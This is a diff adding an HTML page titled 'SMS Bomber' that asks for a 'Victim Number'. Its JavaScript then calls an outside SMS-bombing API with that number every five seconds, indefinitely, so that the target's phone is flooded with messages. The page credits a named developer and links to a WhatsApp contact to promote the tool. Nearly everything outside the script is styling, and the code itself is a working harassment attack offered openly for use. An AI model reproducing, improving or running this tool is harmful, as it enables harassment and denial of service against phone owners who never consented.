@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>SMS Bomber By ATEEQ SHAIKH</title>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <style>
+    body {
+      font-family: 'Poppins', sans-serif;
+      background: #000000;
+      color: #fff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    /* Main Content */
+    #main {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+    }
+
+    h1 {
+      font-size: 22px;
+      margin-bottom: 10px;
+      background: linear-gradient(90deg,#0000FF,#A73BFF,#00ffff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: Dark;
+      text-align: center;
+    }
+
+    .rotating-avatar {
+      width: 135px;
+      height: 135px;
+      margin: 25px auto;
+      border: 6px solid #00fff7;
+      border-radius: 50%;
+      overflow: hidden;
+      box-shadow: 0 0 30px #00fff7;
+      animation: rotate 6s linear infinite;
+    }
+
+    .rotating-avatar img { width: 100%; height: 100%; object-fit: cover; }
+
+    @keyframes rotate { from{transform:rotate(0deg);} to{transform:rotate(360deg);} }
+
+    .container {
+      background: rgba(20,20,30,0.5);
+      backdrop-filter: blur(12px);
+      border-radius: 25px;
+      border: 1px solid rgba(255,255,255,0.2);
+      box-shadow: 0 0 20px rgba(0,255,255,0.2);
+      padding: 30px;
+      max-width: 400px;
+      width: 100%;
+      text-align: center;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin-top: 10px;
+      border-radius: 15px;
+      background: rgba(0,0,0,0.4);
+      color: #0ff;
+      border: none;
+      outline: none;
+      box-sizing: border-box;
+    }
+
+    input:focus { border:2px solid #0ff; box-shadow:0 0 10px #0ff; }
+
+    .btn {
+      margin-top: 15px;
+      padding: 12px 20px;
+      border-radius: 55px;
+      font-size: 14px;
+      cursor: pointer;
+      border: none;
+      transition: transform .2s;
+      display: block;
+      width: 100%;
+      box-sizing: border-box;
+    }
+
+    .btn:hover { transform: scale(1.05); }
+
+    .btn-start {
+      background:linear-gradient(90deg,#ff00ff,#9f00ff);
+      color:#fff;
+      box-shadow:0 0 15px #00fff7;
+    }
+
+    .btn-wa {
+      background: #25D366;
+      color: #fff;
+      box-shadow: 0 0 15px #00fff7;
+      margin-top: 10px;
+    }
+
+    .response {
+      margin-top: 20px;
+      background: #111;
+      padding: 15px;
+      border-radius: 10px;
+      font-size: 19px;
+    }
+
+    footer {
+      margin-top: 30px;
+      font-size: 14px;
+      color: #aaa;
+      text-align:center;
+    }
+
+    /* WhatsApp Floating Button */
+    .wa-float {
+      position: fixed;
+      width: 60px;
+      height: 60px;
+      bottom: 20px;
+      right: 20px;
+      background-color: #00D910;
+      color: #FFF;
+      border-radius: 50px;
+      text-align: center;
+      font-size: 100px;
+      box-shadow: 0 0 20px rgba(37, 211, 102, 0.7);
+      z-index: 100;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      animation: pulse 2s infinite;
+      transition: all 0.3s ease;
+    }
+
+    .wa-float:hover {
+      transform: scale(1.1);
+      box-shadow: 0 0 25px rgba(37, 211, 102, 0.9);
+    }
+
+    @keyframes pulse {
+        0% {
+          box-shadow: 0 0 0 0 rgba(37, 211, 102, 0.7);
+        }
+        70% {
+          box-shadow: 0 0 0 10px rgba(37, 211, 102, 0);
+        }
+        100% {
+          box-shadow: 0 0 0 0 rgba(37, 211, 102, 0);
+        }
+    }
+  </style>
+</head>
+<body>
+  <div id="main">
+    <h1>💣  𒆜 𝔸𝕋𝔼𝔼ℚ 𝕊ℍ𝔸𝕀𝕂ℍ 𝕊𝕄𝕊 𝔹𝕆𝕄𝔹𝔼ℝ 𒆜 💣 </h1>
+    <div class="rotating-avatar">
+      <img src="https://i.postimg.cc/Zq6KRcYz/Screenshot-2025-0928-164109.png" alt="Profile Image">
+    </div>
+    <div class="container">
+      <label>☠️Enter Victim Number☠️</label>
+      <input type="text" id="numberInput" placeholder="e.g. 03001234567">
+      <button class="btn btn-start" onclick="startBomb()">💣 Start Bombing</button>
+      <div class="response" id="responseBox">Response will appear here...</div>
+      <a href=https://wa.me/+923128279756 target="_blank" class="btn btn-wa">🧑‍💻 contect to Developer
+👩‍💻</a>
+    </div>
+    <footer>
+      © 2025 | Developer 😈 <strong>ATEEQ SHAIKH </strong> 😈
+    </footer>
+  </div>
+
+  <a href="https://wa.me/+923128279756" target="_blank" class="wa-float">
+    <i class="fab fa-whatsapp"></i>
+  </a>
+
+<script>
+  function startBomb(){
+    const number=document.getElementById("numberInput").value;
+    const responseBox=document.getElementById("responseBox");
+    if(!number){
+      responseBox.innerText="🚫⚠️ Please enter a number!";
+      return;
+    }
+    responseBox.innerText="💥 Bombing started...";
+    function sendRequest(){
+      fetch(`https://shadowscriptz.xyz/public_apis/smsbomberapi.php?num=${number}`)
+      .then(res=>res.text())
+      .then(data=>{ responseBox.innerText="✅ SMS Sent Successfully!"; })
+      .catch(err=>{ responseBox.innerText=`❌ Error: `+err; })
+      setTimeout(sendRequest,5000);
+    }
+    sendRequest();
+  }
+</script>
+</body>
